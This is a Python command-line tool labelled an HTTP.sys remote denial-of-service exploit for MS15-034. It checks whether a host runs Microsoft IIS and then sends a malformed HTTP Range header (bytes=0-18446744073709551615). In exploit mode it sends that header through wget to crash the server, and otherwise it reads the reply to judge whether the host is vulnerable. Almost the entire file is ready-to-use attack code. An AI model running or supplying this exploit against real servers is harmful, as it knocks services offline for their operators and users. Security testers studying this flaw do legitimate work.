import socket
from argparse import ArgumentParser
import os

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def str2bool(v):
    """ Helper function to handle boolean inputs for argparse """
    if isinstance(v, bool):
        return v
    if v.lower() in ('yes', 'true', 't', 'y', '1'):
        return True
    if v.lower() in ('no', 'false', 'f', 'n', '0'):
        return False
    else:
        raise argparse.ArgumentTypeError('Boolean value expected')

def banner():
    print(bcolors.OKBLUE + """
.   ,  ,-.   , ;--'      ,-.  ,--,   ,. 
|\ /| (   ` '| |        /  /\   /   / | 
| V |  `-.   | `-.  --- | / |  `.  '--| 
|   | .   )  |    )     \/  /    )    | 
'   '  `-'   ' `-'       `-'  `-'     ' 
                                        
     HTTP.sys Remote DoS Exploit
    """ + bcolors.ENDC)

def send_payload(client_socket, payload):
    """ Function to send payload and handle connection """
    try:
        client_socket.send(payload)
        response = client_socket.recv(1024)
        return response
    except Exception as e:
        print(bcolors.RED + f'[!] Error during payload delivery: {e}' + bcolors.ENDC)
        return None

def test_for_vulnerability(ip, port):
    """ Function to check if the server is IIS-based and vulnerable """
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect((ip, port))
        client_socket.send(b'GET / HTTP/1.0\r\n\r\n')
        response = client_socket.recv(1024)
        client_socket.close()
        if b'Microsoft' in response:
            print(bcolors.OKGREEN + '[*] Target is running Microsoft IIS. Proceeding with exploit...' + bcolors.ENDC)
            return True
        else:
            print(bcolors.WARNING + '[*] The target is not running IIS. Exiting.' + bcolors.ENDC)
            return False
    except Exception as e:
        print(bcolors.RED + f'[!] Error connecting to the target: {e}' + bcolors.ENDC)
        return False

def launch_dos_attack(ip, port, exploit):
    """ Function to launch the actual DoS attack """
    hexAllFfff = b'18446744073709551615'
    req = b'GET / HTTP/1.1\r\nHost: test\r\nRange: bytes=0-' + hexAllFfff + b'\r\n\r\n'
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client_socket.connect((ip, port))
        if exploit:
            url = f'http://{ip}:{port}/'
            print('[*] Launching Denial of Service attack on the server: ' + url)
            cmd = f'wget --header="Range: bytes=0-18446744073709551615" {url}'
            os.system(cmd)
            print(bcolors.OKGREEN + '[!!] Payload sent using wget' + bcolors.ENDC)
        else:
            response = send_payload(client_socket, req)
            if response:
                analyze_response(response)
        client_socket.close()

    except Exception as e:
        print(bcolors.RED + f'[!] Error during the attack: {e}' + bcolors.ENDC)
        return

def analyze_response(response):
    """ Analyze the server's response to determine vulnerability """
    if b'Requested Range Not Satisfiable' in response:
        print(bcolors.OKGREEN + '[!!] The host appears to be vulnerable to DoS (MS15-034).' + bcolors.ENDC)
    elif b'The request has an invalid header name' in response:
        print(bcolors.WARNING + '[*] The host does not appear vulnerable to MS15-034.' + bcolors.ENDC)
    else:
        print(bcolors.WARNING + '[*] Unknown response received. Unable to determine vulnerability status.' + bcolors.ENDC)

# Argument parser setup
parser = ArgumentParser(description='MS15-034 - HTTP.sys DoS Exploit')
parser.add_argument('-t', '--targethost', type=str, metavar='', required=True, help='Target IP address')
parser.add_argument('-p', '--port', type=int, metavar='', required=True, help='Target Port')
parser.add_argument('--exploit', type=str2bool, nargs='?', const=True, default=False, help='Execute the exploit')
args = parser.parse_args()

# Display banner
banner()

# Test for vulnerability and proceed
if test_for_vulnerability(args.targethost, args.port):
    launch_dos_attack(args.targethost, args.port, args.exploit)
